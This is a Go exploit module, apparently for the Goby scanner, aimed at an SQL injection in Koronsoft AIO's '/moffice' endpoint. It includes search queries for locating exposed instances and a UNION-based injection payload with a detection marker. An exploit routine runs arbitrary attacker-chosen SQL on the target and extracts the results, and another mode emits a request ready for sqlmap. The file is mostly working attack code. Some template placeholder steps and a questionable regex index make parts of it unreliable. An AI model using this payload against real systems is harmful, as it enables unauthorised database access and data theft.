package exploits

import (
	"errors"
	"net/url"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "koronsoft AIO /moffice?endTime SQL Injection Vulnerability",
    "Description": "<p>The Koronsoft AIO Enterprise Integrated Management Solution addresses various enterprise customer needs, including cross-departmental collaboration, multifunctionality, and ever-changing demands, through its ERP (Enterprise Resource Planning), OA (Office Automation), CRM (Customer Relationship Management), and UDP (User Defined Platform) modules. It integrates e-commerce platforms, payment platforms, ERP platforms, WeChat platforms, and mobile apps to provide both general and customized solutions for businesses</p>",
    "Product": "Cooperation-AIO-MS",
    "Homepage": "http://www.koronsoft.com/",
    "DisclosureDate": "2024-08-19",
    "PostTime": "2024-08-19",
    "Author": "1538279017@qq.com",
    "FofaQuery": "body=\"changeAccount(varAccount)\" || (body=\"KoronCom.TrustedSites\" && body=\"/login.jsp\")",
    "GobyQuery": "body=\"changeAccount(varAccount)\" || (body=\"KoronCom.TrustedSites\" && body=\"/login.jsp\")",
    "Level": "2",
    "Impact": "<p>SQL injection vulnerabilities allow attackers to manipulate database queries through malicious input, leading to data theft, modification, or deletion, and even complete control over the application, resulting in data breaches, application downtime, and financial losses.</p>",
    "Recommendation": "<p>An effective way to prevent SQL injection is to use parameterized queries or prepared statements, ensuring that user input is safely handled and not executed as code. Additionally, all user inputs should be strictly validated and sanitized.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "@@version",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2024"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "科荣AIO管理系统 /moffice?endTime SQL 注入漏洞",
            "Product": "科荣AIO管理系统",
            "Description": "<p>科荣AIO 企业⼀体化管理解决⽅案 通过ERPERP（进销存财务）、OAOA（办公⾃动化）、CRMCRM（客⼾关系管理）、UDPUDP（⾃定义平台），集电⼦商务平台、⽀付平台、ERP 平台、微信平台、移动APP 等解决了众多企业客⼾在管理过程中跨部⻔、多功能、需求多变等通⽤及个性化的问题。<br></p>",
            "Recommendation": "<p>防止SQL注入的有效方法是使用参数化查询或预处理语句，确保用户输入被安全处理而不会被执行为代码。此外，应对所有用户输入进行严格的验证和过滤。<br></p>",
            "Impact": "<p>SQL注入漏洞允许攻击者通过恶意输入操控数据库查询，从而窃取、修改或删除数据，甚至完全控制应用程序，导致数据泄露、应用瘫痪和经济损失。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "koronsoft AIO /moffice?endTime SQL Injection Vulnerability",
            "Product": "Cooperation-AIO-MS",
            "Description": "<p>The Koronsoft AIO Enterprise Integrated Management Solution addresses various enterprise customer needs, including cross-departmental collaboration, multifunctionality, and ever-changing demands, through its ERP (Enterprise Resource Planning), OA (Office Automation), CRM (Customer Relationship Management), and UDP (User Defined Platform) modules. It integrates e-commerce platforms, payment platforms, ERP platforms, WeChat platforms, and mobile apps to provide both general and customized solutions for businesses<br></p>",
            "Recommendation": "<p>An effective way to prevent SQL injection is to use parameterized queries or prepared statements, ensuring that user input is safely handled and not executed as code. Additionally, all user inputs should be strictly validated and sanitized.<br></p>",
            "Impact": "<p>SQL injection vulnerabilities allow attackers to manipulate database queries through malicious input, leading to data theft, modification, or deletion, and even complete control over the application, resulting in data breaches, application downtime, and financial losses.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9937"
}`

	sendPayloaddosdsakacans := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		//GET请求
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 12
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		//按需求选择自己的发包方式

		//---------------------------------------------
		//以下是发包具体内容,这里以POST请求为例
		//---------------------------------------------
		//漏洞的url
		// url := `/templates/attestation/../../kq/app_check_in/get_org_tree.jsp`
		//拼接sql语句

		payload := "/moffice?op=showWorkPlanList&type=1&beginTime=1&endTime="
		sqlurl := "1' UNION ALL SELECT NULL,NULL,NULL," + sql + ",NULL,NULL,NULL-- HYTC"
		sqlurl = url.QueryEscape(sqlurl)
		payload = payload + sqlurl + "&sid=1"

		resp, err := setGetRequest(hostInfo, payload, map[string]string{})
		if err != nil {
			return nil, err
		}
		//状态码可自定义,这里默认200
		if resp.StatusCode != 200 {
			return nil, errors.New("not response 200")
		}
		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sendPayload := sendPayloaddosdsakacans
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符,(select sql from sqlite_master)查询表名
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符

			//检测逻辑,联合注入检测 这里模仿了sqlmap的检测逻辑,让它成功执行sql语句并回显一个字符串,然后我们去匹配

			//如果是其他类型的注入,请按照具体情况进行检测
			sql := "CHAR(113)+CHAR(113)+CHAR(113)+CHAR(112)+CHAR(113)+CHAR(87)+CHAR(88)+CHAR(122)+CHAR(73)+CHAR(116)+CHAR(107)+CHAR(87)+CHAR(99)+CHAR(67)+CHAR(117)+CHAR(99)+CHAR(106)+CHAR(84)+CHAR(77)+CHAR(71)+CHAR(108)+CHAR(119)+CHAR(97)+CHAR(122)+CHAR(87)+CHAR(70)+CHAR(77)+CHAR(111)+CHAR(120)+CHAR(82)+CHAR(118)+CHAR(70)+CHAR(87)+CHAR(97)+CHAR(99)+CHAR(104)+CHAR(67)+CHAR(71)+CHAR(84)+CHAR(80)+CHAR(117)+CHAR(102)+CHAR(101)+CHAR(103)+CHAR(112)+CHAR(113)+CHAR(106)+CHAR(98)+CHAR(107)+CHAR(113)"
			resp, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if !strings.Contains(resp.Utf8Html, "qqqpqWXzItkWcCucjTMGlwazWFMoxRvFWachCGTPufegpqjbkq") {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/moffice?op=showWorkPlanList&type=1&beginTime=1&endTime=`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sendPayload := sendPayloaddosdsakacans
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])
			//Switch ExpParams
			//若自己修改ExpParams,请自行修改switch case
			switch attackType {
			case "sql":
				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil && strings.Contains(err.Error(), "not response 200") {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}

				// 正则匹配利用结果,需自己修改
				// 注意正则匹配返回的结果的数组序号,一般是mathch[1],请先检测到是否匹配到内容,防止panic
				re := regexp.MustCompile(`planType":"(.*?)","title"`)
				matches := re.FindAllStringSubmatch(resp.Utf8Html, -1)
				if len(matches) < 1 {
					//正则失败
					expResult.Output = `Exploitation failed.`
					expResult.Success = false
					return expResult
				}
				expResult.Success = true

				expResult.Output = `The key points you need to extract is : ` + matches[1][1]
				return expResult

			case "sqlPoint":
				_, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `Exploitation failed: ` + err.Error()
					expResult.Success = false
					return expResult
				}
				//sqlPoint,给用户跑sqlmap用,需修改对应的参数
				expResult.Success = true
				expResult.Output = `GET /moffice?op=showWorkPlanList&type=1&beginTime=1&endTime=1*&sid=1 HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close
Cookie: SESS_IDS=prar0e5k1sg95nfsi446rejfp6
Content-Type: application/x-www-form-urlencoded
`
				return expResult
			//检查ExpParams是否设置正确
			default:
				expResult.Output = `Unknown attack type: ` + attackType
				expResult.Success = false
				return expResult
			}
		},
	))
}
